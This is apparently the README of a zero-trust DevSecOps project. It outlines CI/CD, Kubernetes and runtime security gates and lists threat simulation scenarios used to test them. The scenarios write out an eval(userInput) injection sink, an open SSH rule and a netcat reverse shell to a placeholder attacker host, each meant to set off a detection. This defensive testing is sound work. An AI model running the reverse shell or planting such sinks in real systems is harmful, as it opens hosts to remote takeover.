# Zero-Trust Software Supply Chain Platform

An enterprise-grade DevSecOps platform that secures the complete software delivery lifecycle from source code to runtime using a Zero-Trust approach.

## Overview

Traditional DevOps projects focus on deployment automation. This project focuses on securing every stage of the software supply chain.

The platform implements security controls across:

* Developer Workstation
* Source Code Management
* CI/CD Pipeline
* Infrastructure as Code
* Container Build Process
* Artifact Integrity
* Kubernetes Admission Control
* Runtime Threat Detection

## Architecture

```text
Developer
    ↓
GitHub Repository
    ↓
GitHub Actions Pipeline
    ├── Gitleaks
    ├── Semgrep
    ├── OWASP Dependency Check
    ├── Checkov
    ├── Unit Tests
    ├── Syft SBOM
    ├── Trivy
    └── Cosign
    ↓
Container Registry
    ↓
Kyverno Admission Controller
    ↓
Kubernetes Cluster
    ↓
Falco Runtime Security
```

---

## Technology Stack

### CI/CD Security

* GitHub Actions
* Branch Protection Rules
* Pull Request Approval Workflow

### Source Code Security

* Gitleaks
* Semgrep
* SonarQube

### Dependency Security

* OWASP Dependency Check

### Infrastructure Security

* Terraform
* Checkov

### Supply Chain Security

* Syft
* Trivy
* Cosign

### Kubernetes Security

* Kyverno

### Runtime Security

* Falco

### Cloud / Platform

* Docker
* Kubernetes (Kind)
* AWS Compatible Architecture

---

# Security Controls

## Stage 1 – Secret Detection

Tool: Gitleaks

Detects:

* AWS Keys
* GitHub Tokens
* API Keys
* Hardcoded Credentials

Pipeline Behavior:

```text
Secret Found
      ↓
Pipeline Failed
```

---

## Stage 2 – Static Application Security Testing (SAST)

Tool: Semgrep

Detects:

* Command Injection
* Code Injection
* Insecure Functions
* XSS Patterns

Example:

```javascript
eval(userInput)
```

Pipeline Behavior:

```text
Vulnerability Found
        ↓
Pipeline Failed
```

---

## Stage 3 – Dependency Security

Tool: OWASP Dependency Check

Detects:

* Vulnerable Packages
* Known CVEs
* Outdated Dependencies

Pipeline Behavior:

```text
Critical CVE Found
          ↓
Pipeline Failed
```

---

## Stage 4 – Infrastructure Security

Tool: Checkov

Detects:

* Public S3 Buckets
* Open Security Groups
* Unencrypted Resources
* Misconfigured Infrastructure

Pipeline Behavior:

```text
Policy Violation
        ↓
Terraform Blocked
```

---

## Stage 5 – Software Bill of Materials (SBOM)

Tool: Syft

Generates:

```text
sbom.spdx.json
```

Provides complete visibility into application dependencies.

---

## Stage 6 – Container Security

Tool: Trivy

Scans:

* OS Packages
* Application Dependencies
* Container Layers

Pipeline Policy:

```text
Critical Vulnerabilities > 0
                ↓
Pipeline Failed
```

---

## Stage 7 – Image Signing

Tool: Cosign

Workflow:

```text
Build Image
     ↓
Generate Digest
     ↓
Sign Digest
     ↓
Push Signature
```

Benefits:

* Artifact Integrity
* Supply Chain Protection
* Provenance Verification

---

## Stage 8 – Admission Control

Tool: Kyverno

Policy:

Only allow signed container images.

Workflow:

```text
Unsigned Image
      ↓
Deployment Rejected
```

```text
Signed Image
      ↓
Deployment Allowed
```

---

## Stage 9 – Runtime Security

Tool: Falco

Monitors Kubernetes workloads in real time using eBPF.

# Threat Simulation Scenarios

## Scenario 1 – Secret Leak

Injected:

```text
AWS_SECRET_ACCESS_KEY
```

Expected Result:

```text
Gitleaks Detection
Pipeline Failed
```

---

## Scenario 2 – Vulnerable Code

Injected:

```javascript
eval(userInput)
```

Expected Result:

```text
Semgrep Detection
Pipeline Failed
```

---

## Scenario 3 – Vulnerable Dependency

Injected vulnerable package version.

Expected Result:

```text
Dependency Check Detection
Pipeline Failed
```

---

## Scenario 4 – Misconfigured Infrastructure

Created:

```text
0.0.0.0/0 SSH Rule
```

Expected Result:

```text
Checkov Detection
Terraform Blocked
```

---

## Scenario 5 – Vulnerable Container

Built image with critical CVE.

Expected Result:

```text
Trivy Detection
Pipeline Failed
```

---

## Scenario 6 – Unsigned Image Deployment

Attempted deployment of unsigned image.

Expected Result:

```text
Kyverno Rejection
```

---

## Scenario 7 – Runtime Shell Access

Executed:

```bash
kubectl exec -it pod -- bash
```

Expected Result:

```text
Falco Alert
```

---

## Scenario 8 – Reverse Shell

Executed:

```bash
nc -e /bin/sh attacker-ip 4444
```

Expected Result:

```text
Falco Alert
```

---

# Project Structure

```text
enterprise-devsecops/
│
├── .github/
│   └── workflows/
│
├── app/
│
├── terraform/
│
├── security/
│   ├── gitleaks/
│   ├── semgrep/
│   ├── dependency-check/
│   ├── syft/
│   ├── trivy/
│   └── cosign/
│
├── k8s/
│   ├── kyverno/
│   ├── falco/
```

---

# Key Outcomes

* End-to-end software supply chain security
* Signed container image enforcement
* Runtime threat detection using eBPF
* Automated security gates in CI/CD
* Infrastructure compliance validation
* Enterprise-grade Kubernetes security controls
* Zero-Trust deployment architecture

---
